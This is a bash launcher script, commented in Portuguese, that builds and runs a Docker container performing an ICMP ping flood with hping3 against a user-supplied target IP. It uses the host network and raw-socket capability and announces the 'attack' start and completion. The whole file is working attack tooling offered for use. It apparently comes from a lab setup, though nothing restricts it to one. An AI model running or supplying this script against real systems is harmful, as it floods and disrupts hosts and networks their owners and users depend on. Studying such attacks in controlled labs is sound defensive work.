#!/bin/bash

# Script para executar ataque Ping Flood (ICMP)
# Uso: ./run.sh <TARGET_IP>

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

# Verifica se o IP foi fornecido
if [ -z "$1" ]; then
    echo "Usage: $0 <TARGET_IP>"
    echo ""
    echo "Example:"
    echo "  $0 192.168.1.100"
    echo "  $0 172.18.0.2"
    exit 1
fi

TARGET_IP="$1"

# Valida formato básico de IP
if ! [[ $TARGET_IP =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
    echo "[ERROR] Invalid IP format: $TARGET_IP"
    exit 1
fi

echo "=========================================="
echo "  ICMP Ping Flood Attack"
echo "=========================================="
echo ""
echo "Target: $TARGET_IP"
echo ""

# Verifica se a imagem existe, se não, constrói
if ! docker image inspect ping-flood > /dev/null 2>&1; then
    echo "[+] Building ping-flood image..."
    docker build -t ping-flood .
    echo ""
fi

# Executa o ataque na rede do host (para comunicação com outras máquinas na rede)
# Requer --cap-add=NET_RAW para usar hping3
echo "[+] Starting attack..."
docker run --rm \
    --network host \
    --cap-add=NET_RAW \
    -e TARGET_IP="$TARGET_IP" \
    ping-flood

echo ""
echo "[+] Attack completed!"

